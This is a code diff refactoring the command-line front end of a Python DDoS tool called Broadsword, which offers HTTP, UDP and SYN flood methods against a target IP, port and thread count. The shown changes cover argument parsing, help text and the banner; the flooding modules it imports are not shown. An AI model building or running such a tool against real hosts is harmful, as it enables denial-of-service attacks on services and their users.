@@ -1,32 +1,40 @@
-# Broadsword DDoS Tool
-# Version 1.0.2
-# By Brandon Hammond
+#!/usr/bin/python3
+
+"""
+Broadsword DDoS Utility
+
+By Brandon Hammond
+v1.0.3
+"""
 
 # Set the version and author
-__version__ = "1.0.2"
+__version__ = "1.0.3"
 __author__ = "Brandon Hammond"
 
-# Import required modules
+# Imports
 import os
 import sys
 import getopt
 import threading
 import socket
-import core.http as broadsword_http
-import core.udp as broadsword_udp
-import core.syn as broadsword_syn
+import lib.http as broadsword_http
+import lib.udp as broadsword_udp
+import lib.syn as broadsword_syn
 
-# Define the main() function
-def main():
-	# Function: main()
-	# Purpose: Process command line arguments and provide base workflow
+def main(argv):
+	"""Process command line arguments and provide
+	base workflow
+	
+	Arguments:
+		argv - string - The command line arguments passed
+	"""
 	
 	# Attempt to call getopt.getopt()
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hvm:i:p:t:", ["help", "version", "method=", "ip=", "port=", "threads="])
+		opts, args = getopt.getopt(argv, "hvm:i:p:t:", ["help", "version", "method=", "ip=", "port=", "threads="])
 	except getopt.GetoptError as err_msg:
 		# Display error message and exit
-		print("[E] Error parsing command line arguments: {}!".format(err_msg))
+		print("[E] Error processing command line arguments: {}!".format(err_msg))
 		
 	# Predefine variables with their default values
 	attack_method = "http"
@@ -34,9 +42,9 @@ def main():
 	target_port = 80
 	attack_threads = 10
 
-	# Build for loop to parse options
+	# Parse arguments one-by-one
 	for opt, arg in opts:
-		# If -h or --help option used
+		# If -h or --help arguments are used
 		if opt in ("-h", "--help"):
 			# Print help message and exit
 			print("USAGE:")
@@ -55,7 +63,7 @@ def main():
 			print("\t-t, --threads threads\tSpecify how many threads to use. Default is 10")
 			exit(0)
 		
-		# If -v or --version option is used
+		# If -v or --version arguments are used
 		elif opt in ("-v", "--version"):
 			# Print version message and exit
 			print("Broadsword DDoS Tool")
@@ -63,7 +71,7 @@ def main():
 			print("By {}".format(__author__))
 			exit(0)
 			
-		# If -m or --method option is used
+		# If -m or --method arguments are used
 		elif opt in ("-m", "--method"):
 			# Make sure the method is supported
 			if arg in ("http", "udp", "syn"):
@@ -73,32 +81,24 @@ def main():
 				print("[E] Unsupported DDoS method!")
 				exit(0)
 				
-		# If -i or --ip option is used
+		# If -i or --ip arguments are used
 		elif opt in ("-i", "--ip"):
 			# Set the target IP
 			target_ip = arg
 			
-		# If -p or --port option is used
+		# If -p or --port arguments are used
 		elif opt in ("-p", "--port"):
 			# Set the target port
 			target_port = arg
 			
-		# If -t or --threads option is used
+		# If -t or --threads arguments are used
 		elif opt in ("-t", "--threads"):
 			# Set the number of threads to use
 			attack_threads = arg
 			
-		# If an invalid option was used
-		else:
-			# Display error message and exit
-			print("[E] Invalid option specified!")
-			exit()
-			
-	# Begin main workflow
-			
 	# Display the banner
 	print("==============================")
-	print("Broadsword DDoS Tool v1.0.0")
+	print("Broadsword DDoS Tool {}".format(__version__))
 	print("==============================")
 	print("[+] Method: {}".format(attack_method.upper()))
 	print("[+] Target IP: {}".format(target_ip))
@@ -128,4 +128,4 @@ def main():
 	
 # Make sure not running as module and call main()
 if __name__ == "__main__":
-	main()
+	main(sys.argv[1:])
